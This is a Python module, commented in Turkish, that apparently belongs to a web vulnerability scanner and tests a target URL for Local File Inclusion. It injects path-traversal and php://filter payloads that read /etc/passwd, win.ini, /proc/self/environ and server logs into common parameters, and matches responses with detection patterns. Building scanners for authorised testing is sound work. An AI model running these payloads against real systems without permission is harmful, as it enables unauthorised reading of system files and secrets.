# modules/lfi_scanner.py
"""
Local File Inclusion (LFI) Tarama Modülü
Severity: High
"""

import re
import time
from modules.utils import RequestHandler

class Scanner:
    """LFI zafiyetlerini tespit eder"""

    NAME = "Local File Inclusion"
    DESCRIPTION = "Yerel dosya dahil etme açıklarını tespit eder"
    SEVERITY = "High"

    # LFI Payload'ları
    PAYLOADS = [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..\\..\\..\\windows\\win.ini",
        "....\\....\\....\\windows\\win.ini",
        "/etc/passwd",
        "/etc/hosts",
        "/proc/self/environ",
        "/var/log/apache2/access.log",
        "php://filter/read=convert.base64-encode/resource=index.php",
    ]

    # Tespit pattern'leri
    PATTERNS = {
        'unix': [
            r"root:.*:0:0:",
            r"bin:.*:1:1:",
            r"daemon:.*:2:2:",
        ],
        'windows': [
            r"\[fonts\]",
            r"\[extensions\]",
            r"\[mci extensions\]",
        ],
    }

    def __init__(self, target_url, proxy=None):
        self.target_url = target_url
        self.request_handler = RequestHandler(proxy)

    def scan(self):
        """Taramayı çalıştır"""
        result = {
            'module': self.NAME,
            'vulnerable': False,
            'findings': [],
            'tested_payloads': 0
        }

        test_params = ['page', 'file', 'include', 'path', 'document', 'folder', 'root', 'pg']

        for param in test_params:
            for payload in self.PAYLOADS:
                test_url = f"{self.target_url}?{param}={payload}"
                response = self.request_handler.get(test_url)

                if response:
                    result['tested_payloads'] += 1

                    # Unix pattern kontrolü
                    for pattern in self.PATTERNS['unix']:
                        if re.search(pattern, response.text):
                            finding = {
                                'type': 'LFI (Unix)',
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'evidence': 'Unix system file content detected',
                                'severity': self.SEVERITY
                            }
                            result['findings'].append(finding)
                            result['vulnerable'] = True
                            break

                    # Windows pattern kontrolü
                    for pattern in self.PATTERNS['windows']:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            finding = {
                                'type': 'LFI (Windows)',
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'evidence': 'Windows system file content detected',
                                'severity': self.SEVERITY
                            }
                            result['findings'].append(finding)
                            result['vulnerable'] = True
                            break

                time.sleep(0.3)

        return result
